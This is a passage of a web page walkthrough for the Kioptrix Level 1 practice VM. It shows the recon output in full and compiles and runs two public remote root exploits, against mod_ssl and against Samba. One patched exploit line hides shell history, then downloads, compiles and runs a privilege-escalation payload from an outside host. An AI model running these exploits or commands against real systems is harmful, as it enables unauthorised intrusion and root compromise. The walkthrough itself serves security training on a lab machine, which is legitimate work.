0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# nmap -p 139 --script=smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.183.0.224</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-10 16:49 CDT</div><div>Nmap scan report for 10.183.0.224</div><div>Host is up (0.0011s latency).</div><div><div><br/></div></div><div>PORT    STATE SERVICE</div><div>139/tcp open  netbios-ssn</div><div>MAC Address: 00:0C:29:7C:3A:16 (VMware)</div><div><div><br/></div></div><div>Host script results:</div><div>| smb-vuln-cve2009-3103: </div><div>|   VULNERABLE:</div><div>|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)</div><div>|     State: VULNERABLE</div><div>|     IDs:  CVE:CVE-2009-3103</div><div>|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,</div><div>|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a</div><div>|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</div><div>|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,</div><div>|           aka "SMBv2 Negotiation Vulnerability."</div><div>|           </div><div>|     Disclosure date: 2009-09-08</div><div>|     References:</div><div>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</div><div>|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</div><div>|_smb-vuln-ms10-054: false</div><div>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]</div><div><div><br/></div></div><div>Nmap done: 1 IP address (1 host up) scanned in 5.46 seconds</div></div><div><br/></div><div>Googling the CVE, I was able to find the relevant exploit in the exploit database, but of course, this is for Windows, not linux. 😞</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                        | exploits/windows/remote/40280.py</div></div><div><br/></div><div>I noticed that neither nmap nor enum4linux returned the specific Samba version, so I tried to pull it manually using smbclient.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# smbclient -W MYGROUP //10.183.0.224/ipc$ -U''%'' -c q</div></div><div><br/></div><div>This also failed to produce any output, so I stared a packet capture with tshark and ran the command again. Looking at the capture in Wireshark, I can see the Samba version is 2.2.1a.</div><div><br/></div><div><img height="900" src="/assets/images/2019-05-10-kioptrix-level-1-1/0DB8A724-4DDE-447D-95EA-08C29D855622.png" width="1440"/></div><div><br/></div><div>Searching the exploit database for this version of samba produced a known remote code execution vulnerability.<br/></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                            | exploits/multiple/remote/10.c</div></div><div><br/></div><div>I made a copy of the exploit code, compiled it and ran it to see what the options are.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# cp /usr/share/exploitdb/exploits/multiple/remote/10.c .</div><div>root@kali:~/Walkthroughs/kioptrix1# gcc -o sambal 10.c </div><div>root@kali:~/Walkthroughs/kioptrix1# ./sambal </div><div>samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</div><div>--------------------------------------------------------------</div><div>Usage: ./sambal [-bBcCdfprsStv] [host]</div><div><div><br/></div></div><div>-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)</div><div>-B &lt;step&gt;       bruteforce steps (default = 300)</div><div>-c &lt;ip address&gt; connectback ip address</div><div>-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)</div><div>-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)</div><div>-f              force</div><div>-p &lt;port&gt;       port to attack (default = 139)</div><div>-r &lt;ret&gt;        return address</div><div>-s              scan mode (random)</div><div>-S &lt;network&gt;    scan mode</div><div>-t &lt;type&gt;       presets (0 for a list)</div><div>-v              verbose mode</div></div><div><br/></div><div>Looks like we'll need to specify our platform (-b 0), our local IP address (-c 10.183.0.222) and the victim's IP address (10.183.0.224).</div><div><br/></div><div>***NOTE*** I had to modify a line in 10.c to accommodate my IP addressing scheme. The code is checking to make sure there aren't any zeros in the IP address. Since my IP addresses have a zero in the third octet, I was getting an "Invalid IP" error when trying to execute the script. I had to make the following change.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# diff 10.c.old 10.c</div><div>795c795</div><div>&lt;                                 if (ip1 == 0 || ip2 == 0 || ip3 == 0 || ip4 == 0) {</div><div>---</div><div>&gt;                                 if (ip1 == 0 || ip2 == 0 || ip3 &lt; 0 || ip4 == 0) {</div></div><div><br/></div><div>Once I fixed the IP address check and recompiled, I was able to successfully execute the exploit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# ./sambal -b0 -c 10.183.0.222 10.183.0.224</div><div>samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</div><div>--------------------------------------------------------------</div><div>+ Bruteforce mode. (Linux)</div><div>+ Host is running samba.</div><div>+ Worked!</div><div>--------------------------------------------------------------</div><div>*** JE MOET JE MUIL HOUWE</div><div>Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</div><div>uid=0(root) gid=0(root) groups=99(nobody)</div></div><div><br/></div><div>And we found another path to root. 😄</div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></div>
+<div>Hostname: kioptrix</div>
+<div>IP Address: 10.183.0.224</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.224.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# nmap -Pn -sT -sV -sC -A -oA kioptrix1 -p- 10.183.0.224</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-10 09:56 EDT</div>
+    <div>Nmap scan report for 10.183.0.224   </div>
+    <div>Host is up (0.0012s latency).</div>
+    <div>Not shown: 65529 closed ports</div>
+    <div>PORT     STATE SERVICE     VERSION  </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   open  ssh         </font>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 2.9p2</font>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> (protocol 1.99)</font>
+    </div>
+    <div>| ssh-hostkey:</div>
+    <div>|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</div>
+    <div>|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</div>
+    <div>|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</div>
+    <div>|_sshv1: Server supports SSHv1</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</font>
+    </div>
+    <div>| http-methods:</div>
+    <div>|_  Potentially risky methods: TRACE</div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</font>  (Red-Hat/Linux) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</font>
+    </div>
+    <div>|_http-title: Test Page for the Apache Web Server on Red Hat Linux</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp  open  rpcbind     2 (RPC #100000)</font>
+    </div>
+    <div>| rpcinfo:</div>
+    <div>|   program version   port/proto  service</div>
+    <div>|   100000  2            111/tcp  rpcbind</div>
+    <div>|   100000  2            111/udp  rpcbind</div>
+    <div>|   100024  1           1024/tcp  status</div>
+    <div>|_  100024  1           1024/udp  status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</font>  (Red-Hat/Linux) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</font>
+    </div>
+    <div>|_http-title: 400 Bad Request</div>
+    <div>|_ssl-date: 2019-05-10T13:58:35+00:00; +1m50s from scanner time.</div>
+    <div>| sslv2: </div>
+    <div>|   SSLv2 supported</div>
+    <div>|   ciphers: </div>
+    <div>|     SSL2_RC4_64_WITH_MD5</div>
+    <div>|     SSL2_RC2_128_CBC_WITH_MD5</div>
+    <div>|     SSL2_RC4_128_EXPORT40_WITH_MD5</div>
+    <div>|     SSL2_RC4_128_WITH_MD5</div>
+    <div>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</div>
+    <div>|     SSL2_DES_192_EDE3_CBC_WITH_MD5</div>
+    <div>|_    SSL2_DES_64_CBC_WITH_MD5</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">1024/tcp open  status      1 (RPC #100024)</font>
+    </div>
+    <div>MAC Address: 00:0C:29:7C:3A:16 (VMware)</div>
+    <div>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</div>
+    <div>TCP/IP fingerprint:</div>
+    <div>OS:SCAN(V=7.70%E=4%D=5/10%OT=22%CT=1%CU=32224%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</div>
+    <div>OS:M=5CD58418%P=x86_64-pc-linux-gnu)SEQ(SP=C9%GCD=1%ISR=D2%TI=Z%CI=Z%II=I%T</div>
+    <div>OS:S=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=</div>
+    <div>OS:M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1</div>
+    <div>OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A</div>
+    <div>OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%</div>
+    <div>OS:Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=</div>
+    <div>OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</div>
+    <div>OS:Y%DF=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</div>
+    <div>OS:T=FF%CD=S)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Network Distance: 1 hop</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Host script results:</div>
+    <div>|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s</div>
+    <div>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
+    <div>|_smb2-time: Protocol negotiation failed (SMB2)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   1.19 ms 10.183.0.224</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 284.78 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Checking on the versions of software returned by nmap, we have:</div>
+<ul>
+    <li>
+        <div>OpenSSH 2.9p2 - common Username Enumeration issues</div>
+    </li>
+    <li>
+        <div>Apache/1.3.20 - a known overflow issue, but we don't know if mod_rewrite is enabled</div>
+    </li>
+    <li>
+        <div>mod_ssl/2.8.4 - a couple of promising remote buffer overflow issues</div>
+    </li>
+    <li>
+        <div>OpenSSL/0.9.6b - a SSLv2 overflow issue</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>Known Apache issues...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Apache &lt; 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                                                   | exploits/multiple/remote/2237.sh</div>
+</div>
+<div><br /></div>
+<div>Known mod_ssl issues...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                         | exploits/unix/remote/21671.c</div>
+    <div>Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow                                       | exploits/unix/remote/764.c</div>
+</div>
+<div><br /></div>
+<div>Known OpenSSL issues...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                 | exploits/unix/remote/40347.txt</div>
+</div>
+<div><br /></div>
+<div>The colorfully named Remote Buffer Overflow mod_ssl exploit looks like our best option. I'll try version 2.</div>
+<div><br /></div>
+<div>After making the modifications specified here (including installing libssl-dev)...</div>
+<div><a href="https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1" target="_blank">https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1</a></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# apt-get install libssl-dev</div>
+    <div>root@kali:~/Walkthroughs/kioptrix1# diff 764.c.old 764.c</div>
+    <div>23a24,25</div>
+    <div>&gt; #include &lt;openssl/rc4.h&gt;</div>
+    <div>&gt; #include &lt;openssl/md5.h&gt;</div>
+    <div>663c665</div>
+    <div>&lt; #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"</div>
+    <div>---</div>
+    <div>&gt; #define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"</div>
+    <div>961c963</div>
+    <div>&lt;       unsigned char *p, *end;</div>
+    <div>---</div>
+    <div>&gt;       const unsigned char *p, *end;</div>
+    <div>1069c1071,1072</div>
+    <div>&lt;       if (pkey-&gt;type != EVP_PKEY_RSA) {</div>
+    <div>---</div>
+    <div>&gt;       //if (pkey-&gt;type != EVP_PKEY_RSA) {</div>
+    <div>&gt;       if (EVP_PKEY_get1_RSA(pkey) == NULL) {</div>
+    <div>1075c1078,1079</div>
+    <div>&lt;       encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);</div>
+    <div>---</div>
+    <div>&gt;       //encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);</div>
+    <div>&gt;       encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);</div>
+</div>
+<div><br /></div>
+<div>...I was able to compile the exploit successfully.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# gcc -o openfv2 764.c -lcrypto</div>
+</div>
+<div><br /></div>
+<div>Running our exploit to see applicable parameters, we have two options (based on our version of OS/Apache).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# ./openfv2</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>*******************************************************************</div>
+    <div>* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</div>
+    <div>*******************************************************************</div>
+    <div>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</div>
+    <div>* #hackarena  irc.brasnet.org                                     *</div>
+    <div>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</div>
+    <div>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</div>
+    <div>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</div>
+    <div>*******************************************************************</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>: Usage: ./openfv2 target box [port] [-c N]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  target - supported box eg: 0x00   </div>
+    <div>  box - hostname or IP address</div>
+    <div>  port - port for ssl connection</div>
+    <div>  -c open N connections. (use range 40-50 if u dont know)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  Supported OffSet:</div>
+    <div>[...snip...]</div>
+    <div>        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</div>
+    <div>        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Trying the first option (0x6a) fails. Trying the second option (0x6b), we get the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/kioptrix1# ./openfv2 0x6b 10.183.0.224</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>*******************************************************************</div>
+    <div>* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</div>
+    <div>*******************************************************************</div>
+    <div>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</div>
+    <div>* #hackarena  irc.brasnet.org                                     *</div>
+    <div>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</div>
+    <div>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</div>
+    <div>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</div>
+    <div>*******************************************************************</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Establishing SSL connection</div>
+    <div>cipher: 0x4043808c   ciphers: 0x80fc080</div>
+    <div>Ready to send shellcode</div>
+    <div>Spawning shell...</div>
+    <div>bash: no job control in this shell</div>
+    <div>bash-2.05$ </div>
+    <div>-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304 </div>
+    <div>--15:21:00--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</div>
+    <div>           =&gt; `ptrace-kmod.c'</div>
+    <div>Connecting to dl.packetstormsecurity.net:443... connected!</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 3,921 [text/x-csrc]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>    0K ...                                                   100% @   3.74 MB/s</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>15:21:00 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] Attached to 7398</div>
+    <div>[+] Signal caught</div>
+    <div>[+] Shellcode placed at 0x4001189d</div>
+    <div>[+] Now wait for suid shell...</div>
+    <div>id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</div>
+</div>
+<div><br /></div>
+<div>We have a root shell! Mission accomplished.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Checking root's mail</span></div>
+<div><br /></div>
+<div>There's a "friendly" message for us in /var/mail/root...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>cat /var/mail/root</div>
+    <div>From root  Sat Sep 26 11:42:10 2009</div>
+    <div>Return-Path: &lt;root@kioptix.level1&gt;</div>
+    <div>Received: (from root@localhost)</div>
+    <div>        by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831</div>
+    <div>        for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400</div>
+    <div>Date: Sat, 26 Sep 2009 11:42:10 -0400</div>
+    <div>From: root &lt;root@kioptix.level1&gt;</div>
+    <div>Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;</div>
+    <div>To: root@kioptix.level1</div>
+    <div>Subject: About Level 2</div>
+    <div>Status: O</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">If you are reading this, you got root. Congratulations.</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Level 2 won't be as easy...</font>
+    </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>From root  Fri May 10 10:00:19 2019</div>
+    <div>Return-Path: &lt;root@kioptrix.level1&gt;</div>
+    <div>Received: (from root@localhost)</div>
+    <div>        by kioptrix.level1 (8.11.6/8.11.6) id x4AE0JI01185</div>
+    <div>        for root; Fri, 10 May 2019 10:00:19 -0400</div>
+    <div>Date: Fri, 10 May 2019 10:00:19 -0400</div>
+    <div>From: root &lt;root@kioptrix.level1&gt;</div>
+    <div>Message-Id: &lt;201905101400.x4AE0JI01185@kioptrix.level1&gt;</div>
+    <div>To: root@kioptrix.level1</div>
+    <div>Subject: LogWatch for kioptrix.level1</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> ################## LogWatch 2.1.1 Begin ##################### </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> ###################### LogWatch End #########################</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Other Paths to Root?</span></div>
+<div><br /></div>
+<div>The intro message for the VM said...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Welcome to Kioptrix Level 1 Penetration and Assessment Environment</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>--The object of this game:</div>
+    <div>|_Acquire "root" access to this machine.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>There are many ways this can be done, try and find more then one way to</div>
+    <div>appreciate this exercise.</div>
+</div>
+<div><br /></div>
+<div>So, let's see if we can find any other ways to get root on the box.</div>
+<div><br /></div>
+<div>We'll start by looking into the HTTP service on TCP port 80. The default site for the service is the Apache Test Page. The service doesn't have a robots.txt file. Let's scan it with nikto.</div>
+<div><br /></div>
